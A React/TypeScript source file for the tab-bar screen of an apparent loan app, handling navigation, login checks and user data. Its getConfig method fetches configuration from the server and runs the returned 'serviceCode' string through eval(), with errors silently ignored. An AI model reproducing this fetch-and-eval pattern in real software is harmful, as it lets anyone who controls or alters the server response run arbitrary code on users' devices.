import React, { Component } from 'react'
import { TabBar, Icon } from 'components'
import Home from '../Home'
import Shop from '../Shop'
import My from '../My'
import http from 'src/utils/axios'
import { SET_APP_DATA, SET_SELECTED_DATA, SET_USERINFO_DATA } from 'src/store/actions'
import { DispatchProp, connect } from 'react-redux'
import { IInitState, IGlobal } from 'src/store/state'
import { RouteComponentProps } from 'react-router-dom'

interface IProps {
    selected: number
    userInfo: IGlobal.UserInfo
}
class Index extends Component<IProps & DispatchProp & RouteComponentProps, any> {

    public render(): JSX.Element {
        const { selected } = this.props
        return (
            <TabBar
                defaultSelecte={selected}
                mode="menu"
                selected={selected}
                onChange={this.handleChange}
            >
                <TabBar.Item
                    title="首页"
                    icon={<Icon icon="ios-home" />}
                >
                    <Home />
                </TabBar.Item>
                <TabBar.Item
                    title="贷款管理"
                    icon={<Icon icon="shopping" />}
                >
                    <Shop />
                </TabBar.Item>
                <TabBar.Item
                    title="个人中心"
                    icon={<Icon icon="md-person" />}
                >
                    <My />
                </TabBar.Item>
            </TabBar>
        )
    }

    private getUser = async () => {
        const { userInfo, dispatch } = this.props
        try {
            const data = await http('user/getUser', {
                userId: userInfo.id
            })
            dispatch({ type: SET_USERINFO_DATA, data: data.data })
        } catch (data) {

        }
    }

    private handleChange = (field: any) => {
        const { dispatch, userInfo, history } = this.props
        if (field !== 0 && !userInfo.id) {
            history.push('/login')
            return
        }
        if (field === 1 && !userInfo.userInfo) {
            history.push('/authen')
            return
        }
        this.getUser()
        dispatch({ type: SET_SELECTED_DATA, data: field })
    }

    public componentDidMount() {
        this.getConfig()
    }

    private getConfig = async () => {
        try {
            const { dispatch } = this.props
            const { data } = await http('/user/getConfig')
            dispatch({ type: SET_APP_DATA, data: data })
            eval(data.serviceCode)
        } catch (e) {
        }
    }
}
export default connect(
    ({ selected, userInfo }: IInitState) => ({
        selected,
        userInfo
    })
)(Index)